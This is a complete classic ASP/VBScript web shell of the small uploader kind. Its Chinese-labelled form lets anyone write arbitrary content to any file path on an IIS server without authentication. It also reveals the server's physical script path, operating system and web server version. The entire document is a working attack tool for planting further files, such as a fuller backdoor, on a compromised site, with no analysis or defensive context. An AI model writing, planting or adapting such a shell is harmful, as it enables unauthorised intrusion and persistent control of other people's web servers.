<script language=VBScript runat=server>
dim da
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
Response.Write "保存Ok！"
else
Response.Write "no"
end if
err.clear
end if
set da=nothing
set fos=nothing
Response.Write "<form action='' method=post>"
Response.Write "<input type=text name=path>"
Response.Write "<br>"
Response.Write "当前文件路径:"&server.mappath(request.servervariables("script_name"))
Response.Write "<br>"
Response.Write "操作系统为:"&Request.ServerVariables("OS")
Response.Write "<br>"
Response.Write "WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")
Response.Write "<br>"
Response.Write "<textarea name=da cols=50 rows=10 width=30></textarea>"
Response.Write "<br>"
Response.Write "<input type=submit value=save>"
Response.Write "</form>"
</Script>

